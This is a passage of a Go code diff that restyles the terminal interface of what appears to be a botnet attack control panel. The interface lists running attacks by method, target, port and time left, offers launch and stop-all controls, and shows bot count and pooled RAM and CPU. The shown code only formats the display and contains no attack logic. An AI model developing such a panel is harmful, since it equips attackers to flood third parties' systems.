+				remainStr := fmt.Sprintf("%ds", int(atk.remaining.Seconds()))
+
+				b.WriteString(neonRed.Bold(true).Render("    │ "))
+				b.WriteString(neonCyan.Bold(true).Render(fmt.Sprintf("%-10s", truncate(atk.method, 10))))
+				b.WriteString(dim.Render(" │ "))
+				b.WriteString(white.Render(fmt.Sprintf("%-18s", truncate(atk.target+":"+atk.port, 18))))
+				b.WriteString(dim.Render(" │ "))
+				b.WriteString(neonGreen.Render(fmt.Sprintf("%-6s", remainStr)))
+				b.WriteString(dim.Render(" │ "))
+				b.WriteString(bar)
+				b.WriteString(fmt.Sprintf(" %3d%%", int(progress*100)))
+				b.WriteString(neonRed.Bold(true).Render(" │") + "\n")
+			}
+
+			b.WriteString(neonRed.Bold(true).Render("    └──────────────────────────────────────────────────────┘") + "\n")
 		}
 
+		// Controls
 		b.WriteString("\n")
-		b.WriteString(boxStyle.Render("  [s] Stop All  [←] Launch  [r] Refresh  [q] Back"))
-		b.WriteString("\n")
+		b.WriteString(dim.Render("    ╭─────────────────────────────────────────────────────╮") + "\n")
+		b.WriteString(dim.Render("    │ "))
+		b.WriteString(neonRed.Bold(true).Render("[S]") + dim.Render(" STOP ALL  "))
+		b.WriteString(neonCyan.Render("[←]") + dim.Render(" Launch  "))
+		b.WriteString(neonGreen.Render("[R]") + dim.Render(" Refresh  "))
+		b.WriteString(neonYellow.Render("[Q]") + dim.Render(" Back     "))
+		b.WriteString(dim.Render("│") + "\n")
+		b.WriteString(dim.Render("    ╰─────────────────────────────────────────────────────╯") + "\n")
 	}
 
 	return b.String()
@@ -2500,6 +2739,7 @@ func StartTUI() error {
 	m := NewTUIModel()
 	m.botCount = getBotCount()
 	m.totalRAM = getTotalRAM()
+	m.totalCPU = getTotalCPU()
 
 	p := tea.NewProgram(m, tea.WithAltScreen())
 	tuiProgram = p
